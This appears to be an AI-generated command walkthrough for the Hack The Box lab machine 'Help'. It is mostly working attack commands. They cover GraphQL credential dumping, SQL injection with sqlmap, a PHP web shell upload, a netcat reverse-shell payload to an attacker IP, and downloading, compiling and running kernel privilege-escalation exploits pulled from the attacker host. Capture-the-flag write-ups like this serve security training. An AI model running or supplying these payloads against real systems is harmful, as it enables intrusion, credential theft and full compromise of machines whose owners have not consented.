Here is a **Markdown-formatted command walkthrough** for **HTB: Help**, cleanly organized by stage, with context and clarity throughout:

---

# 🆘 HTB: Help – Command Walkthrough

## 📦 Box Info
- **IP**: `10.10.10.121`
- **OS**: Ubuntu 16.04 (Xenial)
- **Difficulty**: Easy
- **Initial Access**: GraphQL → HelpDeskZ Authenticated SQLi / Unauth File Upload
- **Privilege Escalation**: Kernel Exploit (CVE-2017-16995, etc.)

---

## 🔍 Recon

### 🔎 Full TCP Scan
```bash
nmap -sT -p- --min-rate 10000 -oA nmap/alltcp 10.10.10.121
```

### 🔍 Service Detection
```bash
nmap -sC -sV -p 22,80,3000 -oA nmap/scripts 10.10.10.121
```

---

## 🌐 Web Recon – Port 3000 (GraphQL)

### 📊 Discover Schema
```bash
curl -s 10.10.10.121:3000/graphql -H "Content-Type: application/json" \
-d '{ "query": "{ __schema { queryType { name, fields { name, description } } } }" }' | jq
```

### 📚 View User Type Fields
```bash
curl -s 10.10.10.121:3000/graphql -H "Content-Type: application/json" \
-d '{ "query": "{ __type(name: \"User\") { name fields { name } } }" }' | jq
```

### 🔐 Dump User Credentials
```bash
curl -s 10.10.10.121:3000/graphql -H "Content-Type: application/json" \
-d '{ "query": "{ user { username password } }" }' | jq
```

- **Username**: `helpme@helpme.com`  
- **Password (MD5)**: `5d3c93182bb20f07b994a7f617e99cff`  
- **Cracked**: `godhelpmeplz`

---

## 🌐 Web Recon – Port 80 (Apache)

### 🧭 Directory Brute Force
```bash
gobuster -u http://10.10.10.121 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50
```

### 🔍 Discover `/support` (HelpDeskZ)
Login with:
- **Email**: `helpme@helpme.com`
- **Password**: `godhelpmeplz`

---

## 🐚 Shell Access – Method 1: SQLi via Ticket Attachment

### 🔎 Identify SQLi
Modify param in:
```
http://10.10.10.121/support/?v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6
```

Try:
- `...6 AND 1=1-- -` → ✅
- `...6 AND 1=2-- -` → ❌

### ⚙️ Dump with sqlmap
1. Save request in Burp (e.g., `ticket_attachment.request`)
2. Run:
```bash
sqlmap -r ticket_attachment.request --level 5 --risk 3 -p param[] --dump
```

### 🔐 Extracted Creds
- **Username**: `admin`
- **Password**: `Welcome1`

### 🔑 SSH as help
```bash
ssh help@10.10.10.121
# Password: Welcome1
```

---

## 🐚 Shell Access – Method 2: File Upload Exploit

### ⚙️ Upload Webshell
Use:
```php
<?php system($_REQUEST['cmd']); ?>
```

### 🔍 Brute Upload Location (based on time + md5)
```python
# Save as exploit.py
./exploit.py http://10.10.10.121/support/uploads/tickets/ cmd.php
```

### 🧪 Webshell Test
```bash
curl http://10.10.10.121/support/uploads/tickets/<shell>.php?cmd=id
```

### 🎯 Reverse Shell Payload
```bash
curl 'http://10.10.10.121/support/uploads/tickets/<shell>.php?cmd=rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.4+443+>/tmp/f'
nc -lnvp 443
```

---

## 🧬 Shell Upgrade
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo
fg
reset
# Enter: screen
export TERM=screen
```

---

## ⬆️ Privilege Escalation (help → root)

### 📌 Kernel Version
```bash
uname -a
# 4.4.0-116-generic
```

### 🧠 Use Exploits (CVE-2017-16995)
- Move to `/dev/shm`
- Start web server:
```bash
python3 -m http.server 80
```

- On target:
```bash
wget http://10.10.14.4/44298.c
gcc -o a 44298.c
./a
```

Or:

```bash
wget http://10.10.14.4/45010.c
gcc -o a 45010.c
./a
```

Or:

```bash
wget http://10.10.14.4/exploit.sh
chmod +x exploit.sh
./exploit.sh
```

---

## 🏁 Final Flags

### 🧑‍💻 User Flag
```bash
cat /home/help/user.txt
```

### 👑 Root Flag
```bash
cat /root/root.txt
```